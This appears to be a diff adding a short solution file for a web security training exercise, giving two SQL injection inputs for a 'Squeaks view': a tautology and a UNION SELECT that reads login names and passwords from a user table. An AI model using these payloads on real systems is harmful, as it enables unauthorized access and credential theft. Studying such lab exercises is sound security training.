@@ -1,0 +1,7 @@
+In the normal Squeaks view:
+
+	') or (''='
+
+In the ESQL version of the Squeaks view:
+
+	') and 0=1 UNION SELECT '', LoginName, Password FROM WebAppUser --
